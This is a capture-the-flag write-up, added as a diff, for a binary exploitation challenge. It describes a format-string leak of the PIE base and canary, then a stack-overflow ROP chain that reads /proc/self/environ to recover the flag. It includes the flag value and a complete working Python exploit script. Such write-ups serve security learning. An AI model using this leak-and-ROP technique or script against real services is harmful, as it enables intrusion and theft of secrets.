@@ -1,0 +1,151 @@
+5) Dragon Guard (pwn)
+
+The first bug was in the route label handling. The input was passed directly as a format string, so it was possible to leak stack values with payloads like %1$p and %116$p. Using this, I got a PIE leak and the stack canary.
+
+From the binary analysis, the important gadgets and functions were:
+ pop rdi
+ pop rsi
+ pop rdx
+ read@plt
+ open@plt
+ write@plt
+
+There was also a stack overflow in the route note import logic. The overflow offset was:
+0x88 bytes to reach the canary
+then 8 bytes for saved RBP
+then RIP
+
+At first I tried the classic open-read-write chain to open different possible flag paths like /flag, ./flag, /app/flag and so on, but that did not work. To verify that the ORW chain itself was correct, I used it to read known files such as /etc/hosts, which confirmed the ROP chain and file descriptor assumptions were valid.
+
+After that, instead of guessing the flag path, I used the same ORW primitive to read /proc/self/cmdline and /proc/self/environ.
+
+Reading /proc/self/cmdline showed the process was started as:
+ /usr/local/bin/wg
+ dragon-server
+ 10.13.37.1
+ 31337
+
+reading /proc/self/environ revealed the flag directly as an environment variable
+
+The final flag was CTFAC{78240deee282e8e8735981e1ca2878718a61a4903180e11830d167c85b72c247}
+
+I rerwote the script so that only the flag goes to the output. (i got it initially with a messier script i barely spotted the flag:) )
+Script:
+
+import socket
+import struct
+import time
+import re
+
+HOST = "10.13.37.1"
+PORT = 31337
+
+PIE_IDX = 1
+CANARY_IDX = 116
+
+POP_RDI = 0x65c28
+POP_RSI = 0x65c2d
+POP_RDX = 0x65c32
+SCRATCH = 0x754a0
+
+PLT_WRITE = 0x2120
+PLT_READ  = 0x2280
+PLT_OPEN  = 0x2440
+
+READ_FD = 5
+TARGET_PATH = b"/proc/self/environ\x00"
+
+def q(x):
+    return struct.pack("<Q", x)
+
+def recv_some(s, delay=0.25):
+    time.sleep(delay)
+    data = b""
+    s.setblocking(False)
+    try:
+        while True:
+            chunk = s.recv(4096)
+            if not chunk:
+                break
+            data += chunk
+    except:
+        pass
+    s.setblocking(True)
+    return data
+
+def parse_first_hex(text):
+    m = re.search(r'0x[0-9a-fA-F]+', text)
+    if not m:
+        raise ValueError(f"no hex value found in: {text!r}")
+    return int(m.group(0), 16)
+
+def leak(idx):
+    s = socket.create_connection((HOST, PORT))
+    recv_some(s)
+    s.sendall(f"%{idx}$p\n".encode())
+    out = recv_some(s).decode(errors="replace")
+    s.close()
+    return parse_first_hex(out)
+
+def build_payload(base, canary):
+    rop = b""
+
+    # read(4, scratch, 0x80) -> read path from socket
+    rop += q(base + POP_RDI) + q(4)
+    rop += q(base + POP_RSI) + q(base + SCRATCH)
+    rop += q(base + POP_RDX) + q(0x80)
+    rop += q(base + PLT_READ)
+
+    # open(scratch, 0)
+    rop += q(base + POP_RDI) + q(base + SCRATCH)
+    rop += q(base + POP_RSI) + q(0)
+    rop += q(base + PLT_OPEN)
+
+    # read(5, scratch, 0x800)
+    rop += q(base + POP_RDI) + q(READ_FD)
+    rop += q(base + POP_RSI) + q(base + SCRATCH)
+    rop += q(base + POP_RDX) + q(0x800)
+    rop += q(base + PLT_READ)
+
+    # write(4, scratch, 0x800)
+    rop += q(base + POP_RDI) + q(4)
+    rop += q(base + POP_RSI) + q(base + SCRATCH)
+    rop += q(base + POP_RDX) + q(0x800)
+    rop += q(base + PLT_WRITE)
+
+    payload = b"A" * 0x88
+    payload += q(canary)
+    payload += b"B" * 8
+    payload += rop
+    return payload
+
+def main():
+    pie_leak = leak(PIE_IDX)
+    canary = leak(CANARY_IDX)
+    base = pie_leak - POP_RDI
+
+    payload = build_payload(base, canary)
+
+    s = socket.create_connection((HOST, PORT))
+    recv_some(s)
+
+    s.sendall(b"AAAA\n")
+    recv_some(s)
+
+    s.sendall(struct.pack("<H", len(payload)) + payload)
+    time.sleep(0.05)
+    s.sendall(TARGET_PATH.ljust(0x80, b"\x00"))
+
+    out = recv_some(s, 0.6)
+    s.close()
+
+    m = re.search(rb'FLAG=(CTFAC\{[0-9a-fA-F]+\})', out)
+    if m:
+        print(m.group(1).decode())
+    else:
+        print("flag not found")
+        print(out.replace(b"\x00", b"\n").decode(errors="replace"))
+
+if __name__ == "__main__":
+    main()
+            
